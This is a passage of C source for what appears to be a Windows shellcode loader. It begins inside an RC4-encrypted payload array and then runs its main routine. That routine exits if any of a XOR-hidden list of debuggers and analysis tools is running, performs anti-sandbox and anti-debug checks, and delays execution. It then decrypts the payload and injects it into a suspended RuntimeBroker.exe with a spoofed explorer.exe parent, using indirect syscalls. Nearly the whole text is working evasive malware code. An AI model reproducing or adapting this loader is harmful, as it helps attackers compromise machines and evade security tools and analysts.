        0x3F, 0x08, 0x7A, 0x63, 0xFC, 0x0A, 0x65, 0xAC, 0x72, 0x73, 0xB3, 0x17, 0x54, 0x10, 0xED, 0xFC,
        0x58, 0x94, 0x3A, 0x5E, 0x7E, 0xD3, 0x34, 0x48, 0x43, 0x97, 0x71, 0x4B, 0xAF, 0x80, 0x7C, 0xCA,
        0xD0, 0xE0, 0x9D, 0x12, 0x1E, 0xB6, 0x4A, 0x2F, 0xC5, 0xBD, 0xD2, 0xBB, 0x44, 0x15, 0xFD, 0x4E,
        0xFD, 0xC4, 0x5F, 0xF6, 0x3A, 0xA3, 0xC0, 0x21, 0x2E, 0x92, 0xAD, 0xA1, 0x39, 0x81, 0xE4, 0xF1,
        0xB2, 0xA2, 0xD2, 0xEC, 0xB8, 0x2E, 0x57, 0xF4, 0x87, 0xB4, 0xF5, 0x27, 0x97, 0x1B, 0xAC, 0x92,
        0xAD, 0x4C, 0x3B, 0x57, 0xC5, 0xFE, 0xD9, 0x65, 0x33, 0xB9, 0xE1, 0x68, 0x16, 0xDC, 0x81, 0xC5,
        0x99, 0x04, 0x47, 0xEC, 0xE1, 0x3F, 0xD4, 0xF0, 0x14, 0x43, 0xA2, 0xB1, 0x07, 0xFE, 0x1F, 0xC4,
        0x05, 0x83, 0xA0, 0x57, 0xF5, 0xAD, 0x51, 0xC0, 0x7A, 0x43, 0x08, 0x14, 0xED, 0xAB, 0x7E, 0x24,
        0xBA, 0x12, 0xA8, 0xEF, 0x5C, 0xBC, 0x79, 0x06, 0xBB, 0x8D, 0x04, 0x4C, 0xA8, 0x41, 0xA9, 0x87,
        0x67, 0x65, 0x69, 0x47, 0xC3, 0x84, 0x3A, 0x22, 0xE7, 0xDC, 0xDF, 0x91, 0x33, 0xA5, 0x30, 0x6B,
        0x6F, 0xD6, 0x44, 0xD9, 0xBC, 0xD9, 0xE8, 0x72, 0x27, 0x63, 0xFE, 0xAD, 0x8C, 0x06, 0xCC, 0x72,
        0xFB, 0x6D, 0xCA, 0x66, 0x6A, 0x47, 0x54, 0xBA, 0x60, 0x6D, 0x89, 0x7F, 0xD1, 0x03, 0x9C, 0xD7,
        0xB9, 0x32, 0xD6, 0xE8, 0xBE, 0xDA, 0xB4, 0xD5, 0xB7, 0xD1, 0xC8, 0x7B, 0x1B, 0x40, 0x20, 0xD8,
        0x2A, 0x7E, 0xCB, 0x4A, 0x34, 0xBA, 0x0A, 0x80, 0x1C, 0xED, 0x26, 0xF2, 0xED, 0x38, 0x66, 0xC5,
        0xA7, 0x84, 0x06, 0x79, 0x52, 0x6E, 0xBE, 0x4C, 0x31, 0x07, 0xC6, 0x8E, 0x41, 0xD9, 0x8F, 0xD7,
        0xCA, 0x10, 0xD3, 0x12, 0xA7, 0xB0, 0x0F, 0xA4, 0x41, 0xBA, 0xA4, 0xD8, 0x39, 0x57, 0xF4, 0x70,
        0x2E, 0xD0, 0xB6, 0x28, 0xCE, 0x61, 0xC4, 0x6E, 0xD6, 0x29, 0x5D, 0x15, 0x01, 0x1A, 0x95, 0x98,
        0x31, 0x3C, 0xCE, 0x04, 0xEE, 0x13, 0x24, 0x18, 0x15, 0x27, 0xCE, 0x36, 0xA3, 0xE7, 0x17, 0xE5,
        0x1F, 0x66, 0x2B, 0x85, 0xFB, 0x57, 0xB9, 0x27, 0x3F, 0x65, 0xEC, 0x20, 0x52, 0xBE, 0x84, 0xE0,
        0x93, 0x45, 0xCF, 0x10, 0xE7, 0xBF, 0xB0, 0xFA, 0xAB, 0xF9, 0xB0, 0xC8, 0xA4, 0xB2, 0x39, 0x7B,
        0xEF, 0xB3, 0xE2, 0x08, 0x57, 0x55, 0x9B, 0x18, 0x2C, 0x46, 0x18, 0x94, 0x7F, 0x99, 0x04, 0x56,
        0x26, 0x60, 0xA9, 0xC9, 0x37, 0x2B, 0xF1, 0x00, 0x2B, 0xD5, 0xCC, 0x2F, 0xE8, 0x7D, 0x1A, 0xFD,
        0x62, 0x32, 0xE7, 0x73, 0x44, 0x7C, 0xBF, 0x1B, 0xF7, 0xFC, 0x58, 0x02, 0x48, 0xEA, 0x52, 0x41,
        0x7F, 0xAA, 0x08, 0x30, 0xFB, 0xDD, 0x60, 0xD7, 0x28, 0x23, 0xCE, 0x9F, 0x1F, 0x1E, 0xE6, 0x7D,
        0x6C, 0x1F, 0x6B, 0x22, 0xFC, 0x7D, 0xB3, 0x08, 0x79, 0x83, 0x8E, 0xAB, 0xEE, 0x64, 0x71, 0x45,
        0xB8, 0xE8, 0x01, 0xA4, 0x94, 0x20, 0xAB, 0x30, 0x6E, 0x48, 0xCF, 0x5C, 0xFE, 0xEB, 0xF0, 0xB9,
        0xBD, 0x92, 0x85, 0x34, 0xD0, 0x68, 0x3C, 0x22, 0x78, 0x89, 0x2D, 0xB2, 0x6A, 0x43, 0xDC, 0xF8,
        0x17, 0x07, 0x33, 0x46, 0x1D, 0x6F, 0xD0, 0xD7, 0x4A, 0x26, 0x55, 0x71, 0x73, 0x48, 0x2B, 0xE1,
        0x11, 0x8D, 0xC5, 0xE0, 0x09, 0x65, 0x37, 0x7F, 0x72, 0x8C, 0xB6, 0x81, 0x47, 0x33, 0xF6, 0x63,
        0x33, 0x15, 0x75, 0xA7, 0x4A, 0xFD, 0xB5, 0x96, 0x92, 0x0A, 0xEB, 0x35, 0xF2, 0xF8, 0xDA, 0x8C,
        0x11, 0xCC, 0x45, 0x8F, 0x2D, 0x6F, 0x7D, 0x74, 0x46, 0xCD, 0xA0, 0x25, 0xD6, 0x37, 0xC6, 0x62,
        0x3F, 0x0A, 0xA5, 0x1E, 0x85, 0x7F, 0x1B, 0x4A, 0x28, 0x12, 0x7A, 0x32, 0x0A, 0x99, 0xBF, 0xAC };

// Protected key, before Brute Force
unsigned char ProtectedKey[] = {
		0xCC, 0xA2, 0x57, 0x96, 0xBF, 0x11, 0xB4, 0xFC, 0x8D, 0xA3, 0x8B, 0xD7, 0x68, 0xD3, 0xB7, 0x5B };

/* Real Key(used for encryption)
unsigned char OriginalKey[] = {
		0xAC, 0xC1, 0x35, 0xF3, 0xDB, 0x6C, 0xCE, 0x95, 0xE5, 0xBA, 0xE1, 0xAC, 0xFC, 0xA6, 0xC9, 0x2C };
*/

int main() {

    // Initialize the syscalls
    if (!InitializeNtSyscalls()) {
        // printf("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
        return -1;
    }


    // ------------------------------------------------------------------ Anti-Debug ------------------------------------------------------------------
    #define BLACKLISTARRAY_SIZE 17 // Number of elements inside the array
    unsigned char x64dbg[] = { 0x92, 0xdc, 0xde, 0x8e, 0x88, 0x8d, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char x32dbg[] = { 0x92, 0xd9, 0xd8, 0x8e, 0x88, 0x8d, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char ida[] = { 0x83, 0x8e, 0x8b, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char ida64[] = { 0x83, 0x8e, 0x8b, 0xdc, 0xde, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char VsDebugConsole[] = { 0xbc, 0x99, 0xae, 0x8f, 0x88, 0x9f, 0x8d, 0xa9, 0x85, 0x84, 0x99, 0x85, 0x86, 0x8f, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char msvsmon[] = { 0x87, 0x99, 0x9c, 0x99, 0x87, 0x85, 0x84, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char ollydbg[] = { 0x85, 0x86, 0x86, 0x93, 0x8e, 0x88, 0x8d, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char windbg[] = { 0x9d, 0x83, 0x84, 0x8e, 0x88, 0x8d, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char ImmunityDebugger[] = { 0xa3, 0x87, 0x87, 0x9f, 0x84, 0x83, 0x9e, 0x93, 0xae, 0x8f, 0x88, 0x9f, 0x8d, 0x8d, 0x8f, 0x98, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char binaryninja[] = { 0x88, 0x83, 0x84, 0x8b, 0x98, 0x93, 0x84, 0x83, 0x84, 0x80, 0x8b, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char procmon[] = { 0x9a, 0x98, 0x85, 0x89, 0x87, 0x85, 0x84, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char wireshark[] = { 0x9d, 0x83, 0x98, 0x8f, 0x99, 0x82, 0x8b, 0x98, 0x81, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char inetsim[] = { 0x83, 0x84, 0x8f, 0x9e, 0x99, 0x83, 0x87, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char Fiddler[] = { 0xac, 0x83, 0x8e, 0x8e, 0x86, 0x8f, 0x98, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char burpsuite[] = { 0x88, 0x9f, 0x98, 0x9a, 0x99, 0x9f, 0x83, 0x9e, 0x8f, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char ProcessHacker[] = { 0xba, 0x98, 0x85, 0x89, 0x8f, 0x99, 0x99, 0xa2, 0x8b, 0x89, 0x81, 0x8f, 0x98, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char regshot[] = { 0x98, 0x8f, 0x8d, 0x99, 0x82, 0x85, 0x9e, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char* executables[BLACKLISTARRAY_SIZE] = {
        x64dbg,
        x32dbg,
        ida,
        ida64,
        VsDebugConsole,
        msvsmon,
        ollydbg,
        windbg,
        ImmunityDebugger,
        binaryninja,
        procmon,
        wireshark,
        inetsim,
        Fiddler,
        burpsuite,
        ProcessHacker,
        regshot
    };
    size_t sizes[BLACKLISTARRAY_SIZE] = {
        sizeof(x64dbg),
        sizeof(x32dbg),
        sizeof(ida),
        sizeof(ida64),
        sizeof(VsDebugConsole),
        sizeof(msvsmon),
        sizeof(ollydbg),
        sizeof(windbg),
        sizeof(ImmunityDebugger),
        sizeof(binaryninja),
        sizeof(procmon),
        sizeof(wireshark),
        sizeof(inetsim),
        sizeof(Fiddler),
        sizeof(burpsuite),
        sizeof(ProcessHacker),
        sizeof(regshot)
    };
    for (int j = 0; j < BLACKLISTARRAY_SIZE; j++) {
        DWORD	Pid = NULL;
        // Buffer to place UnXored exe name
        WCHAR** UnXored = NULL;
        XorStringDeObfuscate(executables[j], sizes[j], &UnXored);
        ProcessCheckByNtQuery(UnXored, &Pid);
        // wprintf(L"Original string: %s\n", UnXored);
        if (Pid) {
            return -1;
        }
    }




    // ------------------------------------------------------------------ Anti-VM_Sandbox ------------------------------------------------------------------

    // Check Machine-resolution
    BOOL CALLBACK ResolutionCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM ldata);
    BOOL	SANDBOX = FALSE;
    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ResolutionCallback, (LPARAM)(&SANDBOX));
    if (SANDBOX == TRUE) {
        return -1;
    }

    // Check if Filename is hash
    BOOL ExeDigitsInNameCheck();
    if (ExeDigitsInNameCheck()) {
        return -1;
    }

    // Check Number of Running Processes
    BOOL CheckMachineProcesses();
    if (CheckMachineProcesses()) {
        return -1;
    }

    // Check keyboard or mouse clicks
    // Monitor mouse clicks for 30 seconds
    #define MONITOR_TIME   30000
    HANDLE  mouseThread = NULL;
    DWORD   dwThreadId = NULL;
    NTSTATUS            STATUS = NULL;
    mouseThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, &dwThreadId);
    if (mouseThread) {
        // printf("\t\t<<>> Thread %d Is Created To Monitor Mouse Clicks For %d Seconds <<>>\n\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(mouseThread, MONITOR_TIME);

    if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
        // printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
    }
    if (g_dwMouseClicks < 1){
        // printf("[-] Posssibly A Virtual Environment \n");
        return -1;
    }
    }

    // NtDelayExecution for 1 minute (60000 miliseconds) or 10 min via Syscall
    DWORD				dwMilliSeconds = 6000000;
    LARGE_INTEGER		DelayInterval = { 0 };
    LONGLONG			Delay = NULL;
    DWORD				_T0 = NULL, _T1 = NULL;

    // printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));

    // converting from milliseconds to the 100-nanosecond - negative time interval
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    //_T0 = GetTickCount64();

    // sleeping for 'dwMilliSeconds' ms 
    SET_SYSCALL(g_Nt.NtDelayExecution);
    if ((STATUS = RunSyscall(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
        // printf("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }
    //_T1 = GetTickCount64();
     // slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
     //if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
     //    printf("NtDelayExecutionFailed\n");
     //printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

    // Debug Flag Check
    PPEB	pPeb = (PEB*)(__readgsqword(0x60));
    if (pPeb->BeingDebugged)
        return -1;




    // ------------------------------------------------------- Decrypt and De-Obfuscate(IPv4) -------------------------------------------------------
    
    size_t shellcode_length = sizeof(Rc4Encrypted_IPv4Payload);
    size_t ProtectedKey_Length = sizeof(ProtectedKey);
    PVOID pPayload = (unsigned char*)malloc(shellcode_length);
    SIZE_T SizeOfPayload = 0;

    // Shell code will be stored in pointer to char array pbuffer
    if (!Decrypt_by_RC4((unsigned char*)Rc4Encrypted_IPv4Payload, (size_t)shellcode_length, (unsigned char*)ProtectedKey, (size_t)ProtectedKey_Length, pPayload, &SizeOfPayload)) {
        return -1;
    }
 


    // ------------------------------------------------------------------ Injection ------------------------------------------------------------------

    //#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
    //#define PROCESS_PARMS		L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
    //#define PROCESS_PATH		L"C:\\Windows\\System32"

    unsigned char TARGET_PROCESS[] = { 0xb6, 0xd5, 0xd5, 0xb6, 0xa9, 0xd0, 0xb6, 0xbd, 0x83, 0x84, 0x8e, 0x85, 0x9d, 0x99, 0xb6, 0xb9, 0x93, 0x99, 0x9e, 0x8f, 0x87, 0xd9, 0xd8, 0xb6, 0xb8, 0x9f, 0x84, 0x9e, 0x83, 0x87, 0x8f, 0xa8, 0x98, 0x85, 0x81, 0x8f, 0x98, 0xc4, 0x8f, 0x92, 0x8f };
    unsigned char PROCESS_PARMS[] = { 0xa9, 0xd0, 0xb6, 0xbd, 0x83, 0x84, 0x8e, 0x85, 0x9d, 0x99, 0xb6, 0xb9, 0x93, 0x99, 0x9e, 0x8f, 0x87, 0xd9, 0xd8, 0xb6, 0xb8, 0x9f, 0x84, 0x9e, 0x83, 0x87, 0x8f, 0xa8, 0x98, 0x85, 0x81, 0x8f, 0x98, 0xc4, 0x8f, 0x92, 0x8f, 0xca, 0xc7, 0xaf, 0x87, 0x88, 0x8f, 0x8e, 0x8e, 0x83, 0x84, 0x8d };
    unsigned char PROCESS_PATH[] = { 0xa9, 0xd0, 0xb6, 0xbd, 0x83, 0x84, 0x8e, 0x85, 0x9d, 0x99, 0xb6, 0xb9, 0x93, 0x99, 0x9e, 0x8f, 0x87, 0xd9, 0xd8 };

    // Get Parent Process ID to use as Spoof
    DWORD		ParentPid = NULL;
    if (!ProcessCheckByNtQuery(L"explorer.exe", &ParentPid)) {
        // wprintf(L"[!] Cound Not Get %s's Process Id \n", "explorer.exe");
        return -1;
    }
    // wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", "explorer.exe", ParentPid);

    #define PARENT_PID          ParentPid
    STATUS = NULL;
    HANDLE      hProcess = NULL, hThread = NULL, hParentProcess = NULL;
    PVOID		pAddress = NULL;
    SIZE_T		sSize = sizeof(SizeOfPayload);
    DWORD		dwOldProtection = NULL;
    SIZE_T      sNumberOfBytesWritten = NULL;

    // Decode process strings
    WCHAR** UnXored_TARGET_PROCESS = NULL;
    WCHAR** UnXored_PROCESS_PARMS = NULL;
    WCHAR** UnXored_PROCESS_PATH = NULL;
    XorStringDeObfuscate(TARGET_PROCESS, sizeof(TARGET_PROCESS), &UnXored_TARGET_PROCESS);
    XorStringDeObfuscate(PROCESS_PARMS, sizeof(PROCESS_PARMS), &UnXored_PROCESS_PARMS);
    XorStringDeObfuscate(PROCESS_PATH, sizeof(PROCESS_PATH), &UnXored_PROCESS_PATH);

    // Create Process in Suspended State using Indirect Syscall
    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
    if (!NtCreateUserProcessForBoth(UnXored_TARGET_PROCESS, UnXored_PROCESS_PARMS, UnXored_PROCESS_PATH, hParentProcess, &hProcess, &hThread))
        return -1;

    // printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
    // printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));
    // allocate/write payload to target process address
    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
        // printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }
    SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, pAddress, pPayload, SizeOfPayload, &sNumberOfBytesWritten)) != 0x00) {
        // printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }
    // delete payload in local memory
    free(pPayload);

    // change memory permission to RX
    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOldProtection)) != 0x00 || pAddress == NULL) {
        // printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }

    // Execute payload
    SET_SYSCALL(g_Nt.NtCreateThreadEx);
    if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0x00) {
        // printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }
    // printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

    // Wait until thread is done
    SET_SYSCALL(g_Nt.WaitForSingleObject);
    if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
        // printf("[!] WaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }
    
    CloseHandle(hProcess);
    CloseHandle(hThread);

   	return 0;
} 